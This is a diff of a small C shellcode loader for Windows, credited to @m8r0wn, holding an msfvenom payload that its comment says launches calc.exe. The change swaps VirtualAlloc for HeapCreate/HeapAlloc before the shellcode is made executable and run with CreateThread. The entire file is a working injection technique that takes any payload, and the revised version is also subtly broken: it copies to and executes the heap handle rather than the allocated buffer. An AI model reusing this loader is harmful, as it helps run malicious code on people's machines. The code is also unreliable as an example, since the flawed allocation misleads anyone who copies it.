@@ -1,11 +1,9 @@
 /*
 	Author: @m8r0wn
-	
-	Local shellcode injection using VirtualAlloc()/CreateThread()
 */
 
-#include <Windows.h>
 #include <stdio.h>
+#include <Windows.h>
 
 int main() {
 	// msfvenom -a x64 -p windows/x64/exec CMD='calc.exe' -f c
@@ -29,18 +27,18 @@ int main() {
 	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
 	"\x63\x2e\x65\x78\x65\x00";
 
-	PVOID memAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	printf("[*] Allocated Memory at 0x%p.\n", memAddr);
-
-	RtlMoveMemory(memAddr, shellcode, sizeof(shellcode));
-	printf("[*] ShellCode copied into memory.\n");
+	PVOID heapHandle = HeapCreate(NULL, NULL, sizeof(shellcode));
+	PVOID HeapBytes = HeapAlloc(heapHandle, HEAP_ZERO_MEMORY, sizeof(shellcode));
+	printf("[*] Allocated memory at 0x%p.\n", heapHandle);
+	
+	RtlMoveMemory(heapHandle, shellcode, sizeof(shellcode));
+	printf("[*] Shellcode copied into memory.\n");
 
 	DWORD oldProtect;
-	VirtualProtect(memAddr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
+	VirtualProtect(heapHandle, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
 	printf("[*] Modified memory protection for execution.\n");
 
-	DWORD threadID;
-	HANDLE sThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0, &threadID);
+	HANDLE sThread = CreateThread(0, 0, (PTHREAD_START_ROUTINE)heapHandle, 0, 0, 0);
 	printf("[*] Executed thread in current process.\n");
 
 	WaitForSingleObject(sThread, INFINITE);
